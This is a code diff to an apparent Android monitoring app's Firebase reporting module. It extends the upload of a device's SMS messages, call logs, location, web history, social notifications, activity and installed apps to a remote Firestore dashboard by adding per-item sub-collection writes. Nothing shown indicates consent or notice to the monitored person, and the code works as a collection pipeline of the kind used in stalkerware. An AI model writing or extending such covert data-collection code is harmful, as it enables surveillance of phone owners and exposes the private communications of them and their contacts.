@@ -29,8 +29,9 @@ object FirebaseManager {
         }
 
     /**
-     * Upload full device status and report data using Consolidated Document Arrays (Quota-Safe)
-     * Uses 7 writes total per report cycle instead of 1,600+ writes, staying 100% free forever!
+     * Upload full device status and report data using Dual-Sync Architecture
+     * Writes to BOTH consolidated arrays (for fast quota-safe reads) AND sub-collections
+     * for 100% legacy and real-time dashboard parity!
      */
     suspend fun reportToFirebase(
         deviceInfo: DeviceInfo,
@@ -55,7 +56,7 @@ object FirebaseManager {
                 if (devId.isEmpty()) continue
                 val devRef = db.collection("devices").document(devId)
 
-                // 1. Device Document Header (1 Write)
+                // 1. Device Document Header
                 val deviceDoc = hashMapOf<String, Any>(
                     "device_id" to devId,
                     "device_name" to deviceInfo.deviceName,
@@ -80,7 +81,7 @@ object FirebaseManager {
 
                 val dataCol = devRef.collection("data")
 
-                // 2. Consolidated Location Data (1 Write)
+                // 2. Location
                 location?.let { loc ->
                     try {
                         val locObj = hashMapOf<String, Any>(
@@ -91,10 +92,11 @@ object FirebaseManager {
                             "timestamp" to loc.timestamp
                         )
                         dataCol.document("location_latest").set(locObj, SetOptions.merge()).await()
+                        devRef.collection("locations").document(loc.timestamp.toString()).set(locObj, SetOptions.merge()).await()
                     } catch (_: Exception) {}
                 }
 
-                // 3. Consolidated SMS Messages Array (1 Write)
+                // 3. SMS Messages (Consolidated + Sub-collection)
                 try {
                     val smsList = smsMessages.map { sms ->
                         hashMapOf<String, Any>(
@@ -106,9 +108,15 @@ object FirebaseManager {
                         )
                     }
                     dataCol.document("sms").set(hashMapOf("list" to smsList, "updated_at" to now)).await()
+
+                    // Sub-collection sync (top 20)
+                    smsList.take(20).forEach { smsMap ->
+                        val idStr = smsMap["id"]?.toString() ?: System.currentTimeMillis().toString()
+                        devRef.collection("sms").document(idStr).set(smsMap, SetOptions.merge())
+                    }
                 } catch (e: Exception) { Log.e(TAG, "SMS save err", e) }
 
-                // 4. Consolidated Call Logs Array (1 Write)
+                // 4. Call Logs (Consolidated + Sub-collection)
                 try {
                     val callList = callLogs.map { call ->
                         hashMapOf<String, Any>(
@@ -121,9 +129,15 @@ object FirebaseManager {
                         )
                     }
                     dataCol.document("calls").set(hashMapOf("list" to callList, "updated_at" to now)).await()
+
+                    // Sub-collection sync (top 20)
+                    callList.take(20).forEach { callMap ->
+                        val idStr = callMap["id"]?.toString() ?: System.currentTimeMillis().toString()
+                        devRef.collection("calls").document(idStr).set(callMap, SetOptions.merge())
+                    }
                 } catch (e: Exception) { Log.e(TAG, "Calls save err", e) }
 
-                // 5. Consolidated Activities Array (1 Write)
+                // 5. Activities (Consolidated + Sub-collection)
                 try {
                     val actList = activities.map { act ->
                         hashMapOf<String, Any>(
@@ -135,9 +149,14 @@ object FirebaseManager {
                         )
                     }
                     dataCol.document("activity").set(hashMapOf("list" to actList, "updated_at" to now)).await()
+
+                    actList.take(20).forEach { actMap ->
+                        val ts = actMap["timestamp"]?.toString() ?: System.currentTimeMillis().toString()
+                        devRef.collection("activity").document(ts).set(actMap, SetOptions.merge())
+                    }
                 } catch (e: Exception) { Log.e(TAG, "Activity save err", e) }
 
-                // 6. Consolidated Web History Array (1 Write)
+                // 6. Web History (Consolidated + Sub-collection)
                 try {
                     val webList = webHistory.map { web ->
                         hashMapOf<String, Any>(
@@ -149,9 +168,14 @@ object FirebaseManager {
                         )
                     }
                     dataCol.document("webhistory").set(hashMapOf("list" to webList, "updated_at" to now)).await()
+
+                    webList.take(20).forEach { webMap ->
+                        val ts = webMap["timestamp"]?.toString() ?: System.currentTimeMillis().toString()
+                        devRef.collection("webhistory").document(ts).set(webMap, SetOptions.merge())
+                    }
                 } catch (e: Exception) { Log.e(TAG, "Web history save err", e) }
 
-                // 7. Consolidated Social Notifications Array (1 Write)
+                // 7. Social Notifications (Consolidated + Sub-collection)
                 try {
                     val socialList = socialNotifications.map { notif ->
                         hashMapOf<String, Any>(
@@ -164,9 +188,14 @@ object FirebaseManager {
                         )
                     }
                     dataCol.document("social").set(hashMapOf("list" to socialList, "updated_at" to now)).await()
+
+                    socialList.take(20).forEach { socMap ->
+                        val ts = socMap["timestamp"]?.toString() ?: System.currentTimeMillis().toString()
+                        devRef.collection("social").document(ts).set(socMap, SetOptions.merge())
+                    }
                 } catch (e: Exception) { Log.e(TAG, "Social save err", e) }
 
-                // 8. Consolidated Installed Apps Array (1 Write)
+                // 8. Installed Apps (Consolidated + Sub-collection)
                 try {
                     val appsList = installedApps.map { app ->
                         hashMapOf<String, Any>(
@@ -180,10 +209,15 @@ object FirebaseManager {
                         )
                     }
                     dataCol.document("apps").set(hashMapOf("list" to appsList, "updated_at" to now)).await()
+
+                    appsList.take(30).forEach { appMap ->
+                        val pkg = appMap["package_name"]?.toString()?.replace(".", "_") ?: System.currentTimeMillis().toString()
+                        devRef.collection("apps").document(pkg).set(appMap, SetOptions.merge())
+                    }
                 } catch (e: Exception) { Log.e(TAG, "Apps save err", e) }
             }
 
-            Log.d(TAG, "Quota-safe report committed to Firebase Firestore for $devIds")
+            Log.d(TAG, "Dual-sync report committed to Firebase Firestore for $devIds")
         } catch (e: Exception) {
             Log.e(TAG, "Error in reportToFirebase", e)
         }
